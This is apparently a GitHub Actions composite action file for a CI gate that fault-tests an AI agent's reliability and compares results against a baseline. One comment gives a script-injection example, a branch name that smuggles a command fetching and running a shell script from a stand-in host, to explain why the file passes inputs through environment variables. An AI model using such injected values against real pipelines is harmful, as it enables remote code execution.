name: 'HB-Eval Reliability Gate'
description: >-
  Run a fault-injection battery against an agent and fail the build when
  reliability regresses. Warns without blocking until you opt in.
author: 'HB-Eval'

branding:
  icon: 'activity'
  color: 'blue'

inputs:
  agent:
    description: "Agent callable as 'module.path:attribute'."
    required: true
  task:
    description: "JSON file with 'system' and 'question'."
    required: true

  enforce:
    description: >-
      Fail the build when the gate fails. Defaults to false on purpose. Turn it
      on once you have measured your own agent's run-to-run variance and know
      the floors will not fire on noise — a gate that blocks a correct pull
      request gets disabled, and a disabled gate is worse than none because it
      looks like coverage.
    required: false
    default: 'false'

  scenarios:
    description: 'Battery size, 6-60.'
    required: false
    default: '18'
  seed:
    description: >-
      Scenario-selection seed. Fixed by default so two runs face the same
      faults and a difference between them means a difference in the agent.
    required: false
    default: '42'

  min-pei:
    description: 'Minimum Planning Efficiency.'
    required: false
  min-frr:
    description: 'Minimum Failure Resilience.'
    required: false
  min-irs:
    description: 'Minimum Intentional Recovery.'
    required: false
  min-ti:
    description: 'Minimum Traceability (0-5).'
    required: false

  baseline:
    description: >-
      Path to a stored report to compare against. A missing file is fine on a
      first run — it simply becomes the baseline.
    required: false
  max-regression:
    description: >-
      Largest tolerated drop from the baseline. Baseline comparison is far more
      robust than an absolute floor, because both measurements carry the same
      noise.
    required: false
    default: '0.05'
  update-baseline:
    description: >-
      Write this run as the new baseline, but only when it passes. Never on a
      failure: that would ratchet the standard downwards every time something
      broke.
    required: false

  report:
    description: 'Write the full JSON report to this path.'
    required: false

  python-version:
    description: 'Python used to run the gate.'
    required: false
    default: '3.11'
  sdk-version:
    description: >-
      SDK version to install. Pinned by default: a gate whose behaviour changes
      under you without a commit is not a gate.
    required: false
    default: '2.7.0'

outputs:
  passed:
    description: "'true' or 'false'."
    value: ${{ steps.gate.outputs.passed }}

runs:
  using: 'composite'
  steps:
    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: ${{ inputs.python-version }}

    - name: Install HB-Eval
      shell: bash
      run: pip install --quiet "hb-eval-sdk==${{ inputs.sdk-version }}"

    - name: Run the reliability gate
      id: gate
      shell: bash
      env:
        # Inputs are NOT used for credentials. Action inputs appear in run
        # logs, and a secret that shows up in a log is not a secret. The
        # calling workflow passes these through its own env block, where
        # GitHub's masking applies.
        HBEVAL_API_KEY: ${{ env.HBEVAL_API_KEY }}
        HBEVAL_AES_KEY: ${{ env.HBEVAL_AES_KEY }}
        HBEVAL_SIGNING_SECRET: ${{ env.HBEVAL_SIGNING_SECRET }}

        # Passed as environment variables rather than interpolated into the
        # shell command. Interpolating user-controlled values directly into a
        # run block is a script-injection vector: a branch named
        # `"; curl evil.sh | sh; #` would otherwise execute.
        IN_AGENT: ${{ inputs.agent }}
        IN_TASK: ${{ inputs.task }}
        IN_ENFORCE: ${{ inputs.enforce }}
        IN_SCENARIOS: ${{ inputs.scenarios }}
        IN_SEED: ${{ inputs.seed }}
        IN_MIN_PEI: ${{ inputs.min-pei }}
        IN_MIN_FRR: ${{ inputs.min-frr }}
        IN_MIN_IRS: ${{ inputs.min-irs }}
        IN_MIN_TI: ${{ inputs.min-ti }}
        IN_BASELINE: ${{ inputs.baseline }}
        IN_MAX_REGRESSION: ${{ inputs.max-regression }}
        IN_UPDATE_BASELINE: ${{ inputs.update-baseline }}
        IN_REPORT: ${{ inputs.report }}
      run: |
        set -uo pipefail

        # Built as an array so every value stays a single argument regardless
        # of what it contains.
        ARGS=(--agent "$IN_AGENT" --task "$IN_TASK"
              --scenarios "$IN_SCENARIOS" --seed "$IN_SEED"
              --max-regression "$IN_MAX_REGRESSION")

        [ "$IN_ENFORCE" = "true" ] && ARGS+=(--enforce)
        [ -n "$IN_MIN_PEI" ] && ARGS+=(--min-pei "$IN_MIN_PEI")
        [ -n "$IN_MIN_FRR" ] && ARGS+=(--min-frr "$IN_MIN_FRR")
        [ -n "$IN_MIN_IRS" ] && ARGS+=(--min-irs "$IN_MIN_IRS")
        [ -n "$IN_MIN_TI" ]  && ARGS+=(--min-ti "$IN_MIN_TI")
        [ -n "$IN_BASELINE" ] && ARGS+=(--baseline "$IN_BASELINE")
        [ -n "$IN_UPDATE_BASELINE" ] && ARGS+=(--update-baseline "$IN_UPDATE_BASELINE")
        [ -n "$IN_REPORT" ] && ARGS+=(--report "$IN_REPORT")

        set +e
        hb-eval gate "${ARGS[@]}"
        CODE=$?
        set -e

        if [ $CODE -eq 0 ]; then
          echo "passed=true" >> "$GITHUB_OUTPUT"
        else
          echo "passed=false" >> "$GITHUB_OUTPUT"
        fi

        # Exit code 2 is a configuration error, not a reliability failure, and
        # it stops the build regardless of `enforce`. A broken setup reporting
        # "passed" would be the worst outcome available: a green tick over a
        # gate that never ran.
        if [ $CODE -eq 2 ]; then
          echo "::error title=HB-Eval::The gate could not run — see the log above."
          exit 2
        fi
        exit $CODE